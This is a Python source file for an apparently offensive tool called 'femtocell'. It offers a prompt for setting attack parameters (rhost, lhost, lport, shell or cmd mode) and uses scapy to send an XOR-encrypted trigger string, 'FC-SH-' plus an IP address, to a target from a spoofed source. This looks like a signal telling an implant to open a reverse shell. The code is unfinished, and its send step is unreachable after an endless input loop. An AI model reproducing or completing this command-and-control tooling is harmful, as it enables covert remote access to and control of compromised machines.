import scapy.all as scapy

""" 
set
- mode (shell vs cmd)
- transport (i/u/t)
- lhost (get from eth adapter)
- rhost (REQUIRED)
- lport (6006)
- rport (445)
- command (whoami)
- if mode is shell, listen on lhost:lport
- if mode is cmd, use cmd option
show
- all



"""

def xor_encrypt(byte_msg, byte_key):
    encrypt_byte = b''
    for b in byte_msg:
        # print(byte_msg, byte_key, b)
        encrypt_byte += chr(b ^ byte_key).encode()
    return encrypt_byte

def print_help():
    print("read the fucking readme")

def main():
    print("""
    ____               __                  ____
   / __/__  ____ ___  / /_____  ________  / / /
  / /_/ _ \/ __ `__ \/ __/ __ \/ ___/ _ \/ / / 
 / __/  __/ / / / / / /_/ /_/ / /__/  __/ / /  
/_/  \___/_/ /_/ /_/\__/\____/\___/\___/_/_/   

    ~ kindtime & jake

    """)


    params = {
        "mode":"cmd", 
        "transport":"tcp", 
        "lhost": "",
        "rhost": "",
        "lport": 6006,
        "rport": 445,
        "command": "whoami"
    }

    while(True):
        user_in = input("femtocell ~ ").split()
        if(len(user_in) > 1):
            user_cmd = user_in[0]
            if(user_cmd == "set"):
                params[user_in[1]] = user_in[2]
            if(user_cmd == "show"):
                if(user_in[1] == "all"):
                    print(str(params))
                else:
                    print(params[user_in[1]])
        else:
            print_help()

    std = "FC-SH-192.168.10.162\00"
    encrypted = xor_encrypt(std.encode(), 0x10)

    print(encrypted.decode())

    # scapy.send(scapy.IP(dst="192.168.183.152".encode(), src="192.168.10.162".encode())/scapy.ICMP(code=1, type=8)/encrypted)
    # scapy.send(scapy.IP(dst="192.168.183.152".encode(), src="192.168.183.1".encode())/scapy.TCP(sport=6006, dport=135, flags="AP")/encrypted)
    scapy.send(scapy.IP(dst="192.168.183.152".encode(), src="192.168.183.1".encode())/scapy.UDP(sport=6006, dport=6969)/encrypted)

if(__name__ == "__main__"):
    main()